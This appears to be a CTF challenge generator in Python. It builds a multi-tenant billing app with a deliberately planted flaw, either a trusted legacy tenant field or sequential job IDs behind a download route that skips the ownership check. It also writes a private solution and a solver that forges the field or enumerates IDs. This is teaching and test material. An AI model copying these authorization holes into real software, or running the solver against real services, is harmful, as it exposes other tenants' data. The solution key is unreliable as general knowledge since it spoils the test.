from __future__ import annotations

import random
import json
from dataclasses import dataclass

from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml


# Per-instance vulnerability CLASSES. Regeneration draws one seed-first, so a
# writeup for one class does NOT solve a differently-classed sibling:
#   * field_trust         -- the API forwards a legacy tenant field the async
#                            worker over-trusts; forge it to export a foreign
#                            invoice. Job IDs are opaque UUIDs and downloads are
#                            ownership-checked, so enumeration gets you nothing.
#   * predictable_job_id  -- the queue authorizes correctly (the legacy bypass
#                            is gone), but export job IDs are issued from a
#                            legacy incrementing counter AND the download route
#                            forgets to check ownership. A scheduled victim
#                            export already sits at a guessable ID; enumerate
#                            and download it. Forging a tenant field gets you a
#                            403, so that technique does not transfer.
VULN_CLASSES = ("field_trust", "predictable_job_id")


@dataclass(frozen=True)
class Variant:
    vuln_class: str
    export_noun: str
    support_noun: str
    tenant_field: str
    attacker_tenant: str
    victim_tenant: str
    attacker_invoice: str
    victim_invoice: str
    attacker_user: str
    victim_user: str
    job_prefix: str
    victim_seq: int
    counter_start: int
    flag: str


def render_tenant_export(spec: ChallengeSpec, rng: random.Random) -> dict[str, str]:
    variant = _variant(rng)
    route_base = f"/api/{variant.export_noun}"
    support_route = f"/api/{variant.support_noun}"

    public_hints = [
        {"level": 1, "text": f"The {variant.support_noun} feed contains operational clues."},
        {"level": 2, "text": "Compare what the API validates with what the worker later trusts."},
        {"level": 3, "text": _hint_level3(variant)},
    ]

    files = {
        "docker-compose.yml": _compose(),
        ".env.example": f"CTFGEN_FLAG={variant.flag}\n",
        "services/api/Dockerfile": _python_dockerfile("app.py"),
        "services/api/requirements.txt": "flask==3.0.3\nredis==5.0.8\n",
        "services/api/app.py": _api_app(variant, route_base, support_route),
        "services/worker/Dockerfile": _python_dockerfile("worker.py"),
        "services/worker/requirements.txt": "redis==5.0.8\n",
        "services/worker/worker.py": _worker(variant),
        "public/description.md": _description(spec, variant, route_base, support_route),
        "public/hints.yaml": dump_yaml({"hints": public_hints}),
        "private/solution.md": _solution(variant, route_base, support_route),
        "private/variant.json": _variant_json(spec, variant, route_base, support_route),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "private/solver.py": _solver(variant, route_base, support_route),
        "tests/healthcheck.py": _healthcheck(),
        "tests/validate_solver.py": _validate_solver(),
        "tests/validate_variant.py": _validate_variant(variant),
    }
    return files


def _variant(rng: random.Random) -> Variant:
    # Draw the vulnerability class FIRST so the seed selects the solution path;
    # every other value is drawn afterwards and unconditionally, so the variant
    # is fully deterministic for a seed regardless of which class was chosen.
    vuln_class = rng.choice(VULN_CLASSES)
    export_noun = rng.choice(["exports", "bundles", "statements", "archives"])
    support_noun = rng.choice(["notices", "bulletins", "ops-feed", "service-notes"])
    tenant_field = rng.choice(["tenant_ref", "account_scope", "ledger_hint", "billing_realm"])
    attacker_tenant = rng.choice(["northstar", "atlas", "cobalt", "harbor"])
    victim_tenant = rng.choice(["globex", "initech", "umbra", "solstice"])
    if victim_tenant == attacker_tenant:
        victim_tenant = "globex"
    attacker_invoice = f"inv-{rng.randrange(1000, 9999)}-{_token_hex(rng, 2)}"
    victim_invoice = f"inv-{rng.randrange(1000, 9999)}-{_token_hex(rng, 2)}"
    job_prefix = rng.choice(["exp", "job", "batch", "run"])
    victim_seq = rng.randrange(1, 9)
    counter_start = victim_seq + rng.randrange(16, 48)
    flag = f"ctf{{tenant_worker_trust_{_token_hex(rng, 6)}}}"
    return Variant(
        vuln_class=vuln_class,
        export_noun=export_noun,
        support_noun=support_noun,
        tenant_field=tenant_field,
        attacker_tenant=attacker_tenant,
        victim_tenant=victim_tenant,
        attacker_invoice=attacker_invoice,
        victim_invoice=victim_invoice,
        attacker_user="alice",
        victim_user="brenda",
        job_prefix=job_prefix,
        victim_seq=victim_seq,
        counter_start=counter_start,
        flag=flag,
    )


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _hint_level3(v: Variant) -> str:
    if v.vuln_class == "field_trust":
        return f"Look for a legacy JSON field named {v.tenant_field}."
    return "Export job IDs are issued from a legacy incrementing counter, and old jobs stay downloadable."


def _variant_json(spec: ChallengeSpec, v: Variant, route_base: str, support_route: str) -> str:
    # ``tokens`` + ``routes`` are class-independent (same 11 keys either way) so
    # variant-uniqueness scoring does not depend on the drawn class. Class-only
    # facts live under ``vuln_class``/``class_params`` and are not scored.
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": "web_business_logic_tenant_export",
            "vuln_class": v.vuln_class,
            "class_params": {
                "job_prefix": v.job_prefix,
                "victim_seq": v.victim_seq,
                "counter_start": v.counter_start,
            },
            "routes": {
                "export_base": route_base,
                "support": support_route,
            },
            "tokens": {
                "export_noun": v.export_noun,
                "support_noun": v.support_noun,
                "tenant_field": v.tenant_field,
                "attacker_tenant": v.attacker_tenant,
                "victim_tenant": v.victim_tenant,
                "attacker_invoice": v.attacker_invoice,
                "victim_invoice": v.victim_invoice,
                "attacker_user": v.attacker_user,
                "victim_user": v.victim_user,
            },
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


def _compose() -> str:
    return """services:
  redis:
    image: redis:7-alpine
    command: ["redis-server", "--save", "", "--appendonly", "no"]
    networks: [backend]
    read_only: true
    security_opt:
      - no-new-privileges:true

  api:
    build: ./services/api
    environment:
      REDIS_URL: redis://redis:6379/0
      CTFGEN_FLAG: ${CTFGEN_FLAG:-}
    ports:
      - "8080:8080"
    depends_on: [redis]
    networks:
      - frontend
      - backend
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

  worker:
    build: ./services/worker
    environment:
      REDIS_URL: redis://redis:6379/0
      CTFGEN_FLAG: ${CTFGEN_FLAG:-}
    depends_on: [redis]
    networks: [backend]
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

networks:
  frontend:
  backend:
    internal: true
"""


def _python_dockerfile(entrypoint: str) -> str:
    return f"""FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY {entrypoint} .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "{entrypoint}"]
"""


def _support_items(v: Variant) -> str:
    """Class-aware support-feed items (rendered as a Python list literal body).

    field_trust leaks the legacy field name + victim invoice/tenant; the solver
    parses those. predictable_job_id instead advertises the sequential-ID scheme
    and a completed scheduled export -- the field_trust parse deliberately finds
    nothing there, so the adaptive solver falls through to enumeration.
    """
    if v.vuln_class == "field_trust":
        return f'''[
            {{
                "id": "ops-117",
                "severity": "low",
                "message": "Legacy export clients may still send {v.tenant_field}; worker compatibility remains enabled.",
            }},
            {{
                "id": "case-204",
                "severity": "medium",
                "message": "Delayed invoice {v.victim_invoice} for tenant {v.victim_tenant}; export worker retry scheduled.",
            }},
            {{
                "id": "audit-318",
                "severity": "info",
                "message": "Scanner findings against /debug/vars were remediated last quarter.",
            }},
        ]'''
    return f'''[
            {{
                "id": "ops-142",
                "severity": "low",
                "message": "Nightly scheduled export completed for invoice {v.victim_invoice}; bundle retained for audit.",
            }},
            {{
                "id": "case-231",
                "severity": "medium",
                "message": "Export job IDs still use the legacy incrementing counter; historical bundles remain retrievable.",
            }},
            {{
                "id": "audit-318",
                "severity": "info",
                "message": "Scanner findings against /debug/vars were remediated last quarter.",
            }},
        ]'''


def _queue_body(v: Variant, route_base: str) -> str:
    if v.vuln_class == "field_trust":
        return f'''    body = request.get_json(force=True, silent=True) or {{}}
    invoice_id = str(body.get("invoice_id", ""))
    if invoice_id not in INVOICES:
        return jsonify({{"error": "unknown invoice"}}), 404

    user_tenant = TENANTS[user]
    requested_tenant = str(body.get("{v.tenant_field}", user_tenant))

    # Intentional vulnerability (field_trust): the API keeps compatibility with
    # legacy clients by forwarding {v.tenant_field}. The worker later trusts that
    # field as authoritative, so supplying it bypasses the tenant check.
    if "{v.tenant_field}" not in body and INVOICES[invoice_id]["tenant"] != user_tenant:
        return jsonify({{"error": "invoice does not belong to your tenant"}}), 403

    job_id = str(uuid.uuid4())
    job = {{
        "job_id": job_id,
        "created_by": user,
        "requested_at": time.time(),
        "invoice_id": invoice_id,
        "{v.tenant_field}": requested_tenant,
    }}
    redis_client.hset(f"job:{{job_id}}", mapping={{"status": "queued", "created_by": user}})
    redis_client.rpush("export_jobs", json.dumps(job))
    return jsonify({{"job_id": job_id, "status": "queued"}}), 202'''
    return f'''    body = request.get_json(force=True, silent=True) or {{}}
    invoice_id = str(body.get("invoice_id", ""))
    if invoice_id not in INVOICES:
        return jsonify({{"error": "unknown invoice"}}), 404

    user_tenant = TENANTS[user]

    # Authorization is correct here (predictable_job_id): the legacy tenant-field
    # bypass is gone, so a cross-tenant export can never be queued directly.
    if INVOICES[invoice_id]["tenant"] != user_tenant:
        return jsonify({{"error": "invoice does not belong to your tenant"}}), 403

    seq = redis_client.incr("job_seq")
    job_id = f"{v.job_prefix}-{{seq:06d}}"
    job = {{
        "job_id": job_id,
        "created_by": user,
        "requested_at": time.time(),
        "invoice_id": invoice_id,
        "owner_tenant": user_tenant,
    }}
    redis_client.hset(f"job:{{job_id}}", mapping={{"status": "queued", "created_by": user}})
    redis_client.rpush("export_jobs", json.dumps(job))
    return jsonify({{"job_id": job_id, "status": "queued"}}), 202'''


def _download_body(v: Variant) -> str:
    if v.vuln_class == "field_trust":
        return '''    user = current_user()
    job = redis_client.hgetall(f"job:{job_id}")
    if not job:
        return jsonify({"error": "unknown job"}), 404
    if job.get("created_by") != user:
        return jsonify({"error": "job belongs to another user"}), 403
    if job.get("status") != "ready":
        return jsonify({"error": "export is not ready", "status": job.get("status", "missing")}), 409
    return jsonify({"job_id": job_id, "export": job.get("export", "")})'''
    return '''    # Intentional vulnerability (predictable_job_id): the download route never
    # checks that the job belongs to the caller, so any known/guessed job ID is
    # retrievable (IDOR) -- and job IDs are sequential.
    job = redis_client.hgetall(f"job:{job_id}")
    if not job:
        return jsonify({"error": "unknown job"}), 404
    if job.get("status") != "ready":
        return jsonify({"error": "export is not ready", "status": job.get("status", "missing")}), 409
    return jsonify({"job_id": job_id, "export": job.get("export", "")})'''


def _seed_block(v: Variant) -> str:
    """Startup pre-seed of a ready victim export at a guessable sequential ID.

    Only predictable_job_id ships this: a 'scheduled' victim export already sits
    in the store at a low sequential ID, and the counter is advanced past it so
    the attacker's own job lands a small, enumerable distance away.
    """
    if v.vuln_class != "predictable_job_id":
        return ""
    return f'''
_SEEDED = False


def _export_body(invoice_id, row):
    return "\\n".join([
        "invoice_id=" + invoice_id,
        "tenant=" + row["tenant"],
        "amount=" + row["amount"],
        "note=" + row["note"],
    ])


def _ensure_seeded():
    global _SEEDED
    if _SEEDED:
        return
    try:
        if redis_client.setnx("export:seeded", "1"):
            victim_job = "{v.job_prefix}-{v.victim_seq:06d}"
            row = INVOICES["{v.victim_invoice}"]
            redis_client.hset(f"job:{{victim_job}}", mapping={{
                "status": "ready",
                "created_by": "{v.victim_user}",
                "invoice_id": "{v.victim_invoice}",
                "export": _export_body("{v.victim_invoice}", row),
            }})
            redis_client.set("job_seq", {v.counter_start})
        _SEEDED = True
    except Exception:
        # Redis may not be up for the very first request; retry on the next one.
        pass


@app.before_request
def _seed_hook():
    _ensure_seeded()

'''


def _api_app(v: Variant, route_base: str, support_route: str) -> str:
    return f'''from __future__ import annotations

import json
import os
import time
import uuid

import redis
from flask import Flask, jsonify, request

app = Flask(__name__)
redis_client = redis.Redis.from_url(os.environ.get("REDIS_URL", "redis://redis:6379/0"), decode_responses=True)

FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"
TENANTS = {{
    "{v.attacker_user}": "{v.attacker_tenant}",
    "{v.victim_user}": "{v.victim_tenant}",
}}
INVOICES = {{
    "{v.attacker_invoice}": {{
        "tenant": "{v.attacker_tenant}",
        "owner": "{v.attacker_user}",
        "amount": "$142.10",
        "note": "Routine platform subscription.",
    }},
    "{v.victim_invoice}": {{
        "tenant": "{v.victim_tenant}",
        "owner": "{v.victim_user}",
        "amount": "$9,441.00",
        "note": f"Quarterly incident retainer. Flag: {{FLAG}}",
    }},
}}

{_seed_block(v)}
def current_user():
    user = request.headers.get("X-User", "{v.attacker_user}").strip().lower()
    if user not in TENANTS:
        return None
    return user


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "api"}}


@app.get("/api/profile")
def profile():
    user = current_user()
    if user is None:
        return jsonify({{"error": "unknown user"}}), 403
    return jsonify({{
        "user": user,
        "tenant": TENANTS[user],
        "routes": {{
            "support": "{support_route}",
            "queue_export": "{route_base}/queue",
            "export_status": "{route_base}/status/<job_id>",
            "download": "{route_base}/download/<job_id>",
            "my_invoices": "{route_base}/mine",
        }},
    }})


@app.get("{support_route}")
def support_feed():
    return jsonify({{
        "items": {_support_items(v)}
    }})


@app.get("{route_base}/mine")
def my_invoices():
    user = current_user()
    if user is None:
        return jsonify({{"error": "unknown user"}}), 403
    tenant = TENANTS[user]
    visible = [
        {{"invoice_id": invoice_id, "tenant": row["tenant"], "amount": row["amount"]}}
        for invoice_id, row in INVOICES.items()
        if row["tenant"] == tenant
    ]
    return jsonify({{"invoices": visible}})


@app.post("{route_base}/queue")
def queue_export():
    user = current_user()
    if user is None:
        return jsonify({{"error": "unknown user"}}), 403
{_queue_body(v, route_base)}


@app.get("{route_base}/status/<job_id>")
def export_status(job_id):
    user = current_user()
    job = redis_client.hgetall(f"job:{{job_id}}")
    if not job:
        return jsonify({{"error": "unknown job"}}), 404
    if job.get("created_by") != user:
        return jsonify({{"error": "job belongs to another user"}}), 403
    return jsonify(job)


@app.get("{route_base}/download/<job_id>")
def download(job_id):
{_download_body(v)}


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
'''


def _worker(v: Variant) -> str:
    if v.vuln_class == "field_trust":
        process_body = f'''    invoice_id = job["invoice_id"]
    trusted_tenant = job["{v.tenant_field}"]
    row = INVOICES.get(invoice_id)
    if not row or row["tenant"] != trusted_tenant:
        redis_client.hset(f"job:{{job['job_id']}}", mapping={{"status": "failed", "error": "invoice unavailable"}})
        return

    export = "\\n".join([
        "invoice_id=" + invoice_id,
        "tenant=" + row["tenant"],
        "amount=" + row["amount"],
        "note=" + row["note"],
    ])
    redis_client.hset(f"job:{{job['job_id']}}", mapping={{"status": "ready", "export": export}})'''
    else:
        process_body = '''    invoice_id = job["invoice_id"]
    owner_tenant = job.get("owner_tenant")
    row = INVOICES.get(invoice_id)
    # The API already enforced same-tenant access, so the worker only exports
    # invoices the requester legitimately owns.
    if not row or row["tenant"] != owner_tenant:
        redis_client.hset(f"job:{job['job_id']}", mapping={"status": "failed", "error": "invoice unavailable"})
        return

    export = "\\n".join([
        "invoice_id=" + invoice_id,
        "tenant=" + row["tenant"],
        "amount=" + row["amount"],
        "note=" + row["note"],
    ])
    redis_client.hset(f"job:{job['job_id']}", mapping={"status": "ready", "export": export})'''

    return f'''from __future__ import annotations

import json
import os
import time

import redis

redis_client = redis.Redis.from_url(os.environ.get("REDIS_URL", "redis://redis:6379/0"), decode_responses=True)
FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"

INVOICES = {{
    "{v.attacker_invoice}": {{
        "tenant": "{v.attacker_tenant}",
        "amount": "$142.10",
        "note": "Routine platform subscription.",
    }},
    "{v.victim_invoice}": {{
        "tenant": "{v.victim_tenant}",
        "amount": "$9,441.00",
        "note": f"Quarterly incident retainer. Flag: {{FLAG}}",
    }},
}}


def process(job):
{process_body}


def main():
    while True:
        try:
            item = redis_client.blpop("export_jobs", timeout=5)
        except Exception:
            time.sleep(1)
            continue
        if not item:
            continue
        _, payload = item
        try:
            process(json.loads(payload))
        except Exception as exc:
            try:
                job = json.loads(payload)
                redis_client.hset(f"job:{{job['job_id']}}", mapping={{"status": "failed", "error": str(exc)}})
            except Exception:
                pass
        time.sleep(0.2)


if __name__ == "__main__":
    main()
'''


def _description(spec: ChallengeSpec, v: Variant, route_base: str, support_route: str) -> str:
    return f"""# {spec.title}

You have access to a tenant-scoped billing portal as `{v.attacker_user}`.

The company recently migrated invoice export jobs from the API service into a worker service. Your goal is to retrieve the flag from another tenant's invoice export without credentials for that tenant.

Start at:

- `GET /api/profile`
- `GET {support_route}`
- `GET {route_base}/mine`

Use the `X-User: {v.attacker_user}` request header. The flag format is `ctf{{...}}`.

This challenge is generated as a stateful business-logic variant. The exact route names, tenant names, invoice IDs, legacy field names, job-ID scheme, and the flaw that lets you cross the tenant boundary may differ across generated instances -- inspect the running service rather than assuming a single fixed path.
"""


def _solution(v: Variant, route_base: str, support_route: str) -> str:
    if v.vuln_class == "field_trust":
        return f"""# Private Solution

Vulnerability class: **field_trust**.

The API blocks cross-tenant invoice exports only when the legacy field `{v.tenant_field}` is absent. If that field is supplied, the API forwards it to the worker. The worker trusts `{v.tenant_field}` as the invoice tenant and exports the invoice when the supplied tenant matches the invoice record.

Solve path:

1. Request `/api/profile` with `X-User: {v.attacker_user}`.
2. Read `{support_route}` and find victim invoice `{v.victim_invoice}` and tenant `{v.victim_tenant}`.
3. Queue an export, forging the legacy field:

```json
{{"invoice_id": "{v.victim_invoice}", "{v.tenant_field}": "{v.victim_tenant}"}}
```

4. Poll `{route_base}/status/<job_id>`.
5. Download `{route_base}/download/<job_id>` and extract the flag from the export body.

This teaches authorization consistency across asynchronous service boundaries. Note: enumerating job IDs does NOT work here -- IDs are opaque UUIDs and downloads are ownership-checked.
"""
    return f"""# Private Solution

Vulnerability class: **predictable_job_id**.

The queue endpoint authorizes correctly (forging a tenant field returns 403). The real flaws are that export job IDs come from a legacy incrementing counter (`{v.job_prefix}-000001`, `{v.job_prefix}-000002`, ...) and the download route never checks that a job belongs to the caller (IDOR). A scheduled export of the victim's invoice already sits at a low sequential ID.

Solve path:

1. Request `/api/profile` with `X-User: {v.attacker_user}`.
2. Read `{support_route}`: a nightly export for `{v.victim_invoice}` has already completed, and job IDs use the legacy incrementing scheme.
3. Queue any of your OWN invoices to observe the current ID, e.g. `{v.job_prefix}-{v.counter_start + 1:06d}`.
4. Enumerate lower IDs (`{v.job_prefix}-000001` upward) and `GET {route_base}/download/<job_id>` for each -- the download route does not verify ownership.
5. The victim's ready export (near `{v.job_prefix}-{v.victim_seq:06d}`) contains the flag.

This teaches that predictable identifiers plus a missing object-level authorization check are exploitable even when the primary business-logic gate is correct. Note: forging the legacy tenant field does NOT work here.
"""


def _solver(v: Variant, route_base: str, support_route: str) -> str:
    # The solver is ADAPTIVE and class-agnostic: it discovers routes at runtime,
    # attempts the field_trust technique, and -- if that yields no flag -- falls
    # through to sequential-ID enumeration. It therefore solves any instance of
    # either class and any sibling, preserving validate-runtime + cross-replay.
    return '''from __future__ import annotations

import argparse
import json
import re
import sys
import time
from urllib import error, request


ATTACKER = "alice"


def _client(base, user):
    def get(path):
        req = request.Request(base + path, headers={"X-User": user})
        try:
            with request.urlopen(req, timeout=5) as response:
                return response.status, response.read().decode("utf-8")
        except error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8")

    def post_json(path, payload):
        req = request.Request(
            base + path,
            data=json.dumps(payload).encode("utf-8"),
            headers={"X-User": user, "Content-Type": "application/json"},
            method="POST",
        )
        try:
            with request.urlopen(req, timeout=5) as response:
                return response.status, json.loads(response.read().decode("utf-8"))
        except error.HTTPError as exc:
            try:
                return exc.code, json.loads(exc.read().decode("utf-8"))
            except Exception:
                return exc.code, {}

    return get, post_json


def _find_flag(text):
    match = re.search(r"ctf\\{[^}]+\\}", text)
    return match.group(0) if match else None


def _try_field_trust(get, post_json, routes):
    """Forge the legacy tenant field the worker over-trusts."""
    _, feed = get(routes["support"])
    invoice_match = re.search(r"invoice (inv-[0-9]{4}-[0-9a-f]{4}) for tenant ([a-z]+)", feed)
    field_match = re.search(r"may still send ([a-z_]+)", feed)
    if not invoice_match or not field_match:
        return None
    invoice_id, tenant = invoice_match.group(1), invoice_match.group(2)
    tenant_field = field_match.group(1)

    status, queued = post_json(routes["queue_export"], {"invoice_id": invoice_id, tenant_field: tenant})
    if status != 202 or "job_id" not in queued:
        return None
    job_id = queued["job_id"]

    status_url = routes["export_status"].replace("<job_id>", job_id)
    for _ in range(40):
        _, body = get(status_url)
        try:
            if json.loads(body).get("status") == "ready":
                break
        except Exception:
            pass
        time.sleep(0.25)

    _, download = get(routes["download"].replace("<job_id>", job_id))
    return _find_flag(download)


def _try_predictable_job_id(get, post_json, routes):
    """Learn the sequential ID scheme, then enumerate downloads (IDOR)."""
    _, mine = get(routes["my_invoices"])
    try:
        own_invoice = json.loads(mine)["invoices"][0]["invoice_id"]
    except Exception:
        return None

    status, queued = post_json(routes["queue_export"], {"invoice_id": own_invoice})
    if status != 202 or "job_id" not in queued:
        return None
    job_id = queued["job_id"]

    seq_match = re.match(r"^([a-z]+)-(\\d+)$", job_id)
    if not seq_match:
        return None
    prefix, current = seq_match.group(1), int(seq_match.group(2))
    width = len(seq_match.group(2))

    download = routes["download"]
    for candidate in range(max(1, current - 1), 0, -1):
        cid = "%s-%0*d" % (prefix, width, candidate)
        _, body = get(download.replace("<job_id>", cid))
        flag = _find_flag(body)
        if flag:
            return flag
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--user", default=ATTACKER)
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    get, post_json = _client(base, args.user)

    _, profile_body = get("/api/profile")
    routes = json.loads(profile_body)["routes"]

    for technique in (_try_field_trust, _try_predictable_job_id):
        flag = technique(get, post_json, routes)
        if flag:
            print(flag)
            return 0

    raise RuntimeError("flag not found by any known technique")


if __name__ == "__main__":
    sys.exit(main())
'''


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    with request.urlopen(args.base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _validate_solver() -> str:
    return '''from __future__ import annotations

from pathlib import Path


def test_solver_mentions_flag_pattern():
    solver = Path("private/solver.py").read_text(encoding="utf-8")
    assert "ctf\\\\{" in solver
    assert "urllib" in solver
'''


def _validate_variant(v: Variant) -> str:
    # Assert only class-independent tokens (the victim invoice/tenants) are baked
    # into the API image, so the check holds for either vulnerability class.
    return f'''from __future__ import annotations

from pathlib import Path


def test_variant_tokens_are_present():
    app = Path("services/api/app.py").read_text(encoding="utf-8")
    assert "{v.victim_invoice}" in app
    assert "{v.victim_tenant}" in app
    assert "{v.attacker_tenant}" in app
'''
